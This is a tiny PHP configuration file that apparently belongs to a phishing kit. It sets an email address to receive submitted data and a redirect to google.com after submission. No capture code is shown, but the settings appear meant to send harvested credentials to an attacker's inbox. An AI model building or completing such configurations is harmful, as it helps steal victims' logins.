<?php 
$Receive_email="cxvdrkbkj@gmail.com";
$redirect="https://www.google.com/";
?>